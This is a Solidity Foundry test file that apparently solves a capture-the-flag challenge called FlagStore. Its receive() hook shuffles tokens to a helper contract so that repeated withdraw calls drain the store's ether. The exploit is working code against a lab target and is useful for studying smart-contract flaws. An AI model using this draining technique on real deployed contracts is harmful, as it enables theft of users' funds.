// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../../src/FlagStore.sol";

contract Friend{
    address parent;
    TetCTFToken token;
    constructor(TetCTFToken _token, address _parent){
        parent = _parent;
        token = _token;
    }

    function payback()external{
        token.transfer(parent, token.balanceOf(address(this)));
    }
}

contract FlagStoreTest is Test {
    FlagStore flagStore;
    TetCTFToken token;
    string me = "me";
    Friend friend;

    function setUp() public {
        vm.prank(address(0));
        flagStore = new FlagStore();
        token = flagStore.token();
        vm.deal(address(flagStore), 10 ether);
    }

    function test_getFlag() public {
        vm.deal(address(this), 1 ether);
        flagStore.deposit{value: 1 ether}();

        friend = new Friend(token, address(this));

        for (uint i=0; i< 10; i++){
            flagStore.withdraw();
            friend.payback();
        }

        console.log("balance: ", address(this).balance);
    }

    receive() external payable{
        console.log("Recv ether", msg.value);
        token.transfer(address(friend), token.balanceOf(address(this)));
    }


}
